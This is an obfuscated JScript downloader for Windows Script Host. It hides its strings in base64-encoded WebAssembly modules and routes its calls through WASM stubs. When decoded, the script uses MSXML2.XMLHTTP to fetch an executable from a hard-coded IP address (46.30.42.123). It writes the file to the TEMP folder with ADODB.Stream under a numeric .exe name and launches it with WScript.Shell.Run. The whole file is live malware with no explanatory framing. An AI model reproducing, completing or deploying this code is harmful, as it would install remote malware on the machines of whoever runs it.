const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __forWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAABfwKkgICAAAMDZW52BHRlc3QAAQNlbnYGdXBkYXRlAAADZW52BGJvZHkAAAOCgICAAAEABISAgIAAAXAAAAWDgICAAAEAAQeRgICAAAIGbWVtb3J5AgAEZGF0YQADCpmAgIAAAZOAgIAAAAJAA0AQAEUNARACEAEMAAsLCw==';
const __forWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__forWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__forWasmBuffer, 'base64'));
    }
})());
const __ifWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAF/AAKfgICAAAIDZW52CGltcEZ1bmMxAAADZW52CGltcEZ1bmMyAAADgoCAgAABAQSEgICAAAFwAAAFg4CAgAABAAEHkYCAgAACBm1lbW9yeQIABGRhdGEAAgqSgICAAAGMgICAAAAgAARAEAAFEAELCw==';
const __ifWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__ifWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__ifWasmBuffer, 'base64'));
    }
})());
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGj4GAgAAZfwBBAQt/AEEIC38AQQ4LfwBBFgt/AEEYC38AQSILfwBBLgt/AEE2C38AQcYAC38AQcwAC38AQeIAC38AQegAC38AQewAC38AQfAAC38AQfQAC38AQfgAC38AQfwAC38AQYgBC38AQY4BC38AQZoBC38AQaYBC38AQaoBC38AQa4BC38AQbIBC38AQbYBCwfhgYCAABoGbWVtb3J5AgAFZGF0YTADAAVkYXRhMQMBBWRhdGEyAwIFZGF0YTMDAwVkYXRhNAMEBWRhdGE1AwUFZGF0YTYDBgVkYXRhNwMHBWRhdGE4AwgFZGF0YTkDCQZkYXRhMTADCgZkYXRhMTEDCwZkYXRhMTIDDAZkYXRhMTMDDQZkYXRhMTQDDgZkYXRhMTUDDwZkYXRhMTYDEAZkYXRhMTcDEQZkYXRhMTgDEgZkYXRhMTkDEwZkYXRhMjADFAZkYXRhMjEDFQZkYXRhMjIDFgZkYXRhMjMDFwZkYXRhMjQDGAurgoCAABkAQQELBUIuU3QAAEEICwVyZWFtAABBDgsGV1NjcmkAAEEWCwEAAEEYCwlwdC5TaGVsbAAAQSILCjIuWE1MSFRUUAAAQS4LBk1TWE1MAABBNgsOJTI1VEVNUCUyNSU1QwAAQcYACwVFeHBhAABBzAALFW5kRW52aXJvbm1lbnRTdHJpbmdzAABB4gALBUFET0QAAEHoAAsCRwAAQewACwNFVAAAQfAACwJoAABB9AALAnQAAEH4AAsDdHAAAEH8AAsKJTNBJTJGJTJGAABBiAELBDQ2LgAAQY4BCwozMC40Mi4xMjMAAEGaAQsKJTJGdmVudHVyAABBpgELAmkAAEGqAQsDLmUAAEGuAQsCeAAAQbIBCwJlAABBtgELDjExODM5NzQ5Mi5leGUA'].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
(() => {
    const __callInstance8 = new WebAssembly.Instance(__callWasmModule, {
        env: {
            impFunc: () => {
                (function (nIqktDBBKIhGHi) {
                    function AcrwBAQLGzpOE(vQxaqCMhLbwm) {
                        return new nIqktDBBKIhGHi.ActiveXObject(vQxaqCMhLbwm);
                    }
                    var ITgfBb = true, KcDWBWfcvGalD = lS(0, 0) + (654035, lS(0, 1));
                    var spaYaT;
                    spaYaT = function (BTAtHeHdLXu, cSrZHOXMZsExiz, KRzpnZlCPqR) {
                        YfIkelcPtYki = (1 ? lS(0, 2) : lS(0, 3)) + lS(0, 4);
                        var NuqaiTqpRoItc = AcrwBAQLGzpOE(YfIkelcPtYki);
                        var hrAwQgybokBAo = lS(0, 5);
                        var cHRegmXPzOSpiF = AcrwBAQLGzpOE(lS(0, 6) + (773437, hrAwQgybokBAo));
                        var pADYABLrvEaJg = lS(0, 7);
                        var lkpeKNQBywM = NuqaiTqpRoItc[lS(0, 8) + lS(0, 9)](pADYABLrvEaJg);
                        var cSrZHOXMZsExiz = lkpeKNQBywM + (439962442659, cSrZHOXMZsExiz);
                        cHRegmXPzOSpiF.onreadystatechange = function () {
                            if (cHRegmXPzOSpiF.readyState == 4) {
                                ITgfBb = false;
                                with (AcrwBAQLGzpOE(lS(0, 10) + KcDWBWfcvGalD)) {
                                    (() => {
                                        const __callInstance7 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    open();
                                                }
                                            }
                                        });
                                        const __exports = __callInstance7.exports;
                                        return __exports.data();
                                    })();
                                    type = 1;
                                    (() => {
                                        const __callInstance6 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    write(cHRegmXPzOSpiF.ResponseBody);
                                                }
                                            }
                                        });
                                        const __exports = __callInstance6.exports;
                                        return __exports.data();
                                    })();
                                    (() => {
                                        const __callInstance5 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    saveToFile(cSrZHOXMZsExiz, 2);
                                                }
                                            }
                                        });
                                        const __exports = __callInstance5.exports;
                                        return __exports.data();
                                    })();
                                    (() => {
                                        const __callInstance4 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    close();
                                                }
                                            }
                                        });
                                        const __exports = __callInstance4.exports;
                                        return __exports.data();
                                    })();
                                    return cSrZHOXMZsExiz;
                                }
                            }
                        };
                        (() => {
                            const __callInstance3 = new WebAssembly.Instance(__callWasmModule, {
                                env: {
                                    impFunc: () => {
                                        cHRegmXPzOSpiF.open(lS(0, 11) + (3884346, 4879543, lS(0, 12)), BTAtHeHdLXu, false);
                                    }
                                }
                            });
                            const __exports = __callInstance3.exports;
                            return __exports.data();
                        })();
                        (() => {
                            const __callInstance2 = new WebAssembly.Instance(__callWasmModule, {
                                env: {
                                    impFunc: () => {
                                        cHRegmXPzOSpiF.send();
                                    }
                                }
                            });
                            const __exports = __callInstance2.exports;
                            return __exports.data();
                        })();
                        zHAiGRg = nIqktDBBKIhGHi.WScript.Sleep(1100);
                        (() => {
                            const __forInstance0 = new WebAssembly.Instance(__forWasmModule, {
                                env: {
                                    test: () => {
                                        return ITgfBb ? 1 : 0;
                                    },
                                    update: () => {
                                    },
                                    body: () => {
                                        {
                                            zHAiGRg;
                                        }
                                    }
                                }
                            });
                            const __exports = __forInstance0.exports;
                            return __exports.data();
                        })();
                        (() => {
                            const __ifInstance0 = new WebAssembly.Instance(__ifWasmModule, {
                                env: {
                                    impFunc1: () => {
                                        (() => {
                                            const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
                                                env: {
                                                    impFunc: () => {
                                                        NuqaiTqpRoItc.Run(cSrZHOXMZsExiz, 0, 0);
                                                    }
                                                }
                                            });
                                            const __exports = __callInstance1.exports;
                                            return __exports.data();
                                        })();
                                    },
                                    impFunc2: () => {
                                    }
                                }
                            });
                            const __exports = __ifInstance0.exports;
                            return __exports.data((new Date() > 0, 2998) ? 1 : 0);
                        })();
                    };
                    QQqqvuueTlIOX = lS(0, 13);
                    QQqqvuueTlIOX += lS(0, 14);
                    QQqqvuueTlIOX += lS(0, 15);
                    (() => {
                        const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
                            env: {
                                impFunc: () => {
                                    spaYaT(QQqqvuueTlIOX + lS(0, 16) + lS(0, 17) + lS(0, 18) + lS(0, 19) + lS(0, 20) + lS(0, 21) + lS(0, 22) + lS(0, 23), lS(0, 24), 1);
                                }
                            }
                        });
                        const __exports = __callInstance0.exports;
                        return __exports.data();
                    })();
                }(this));
            }
        }
    });
    const __exports = __callInstance8.exports;
    return __exports.data();
})();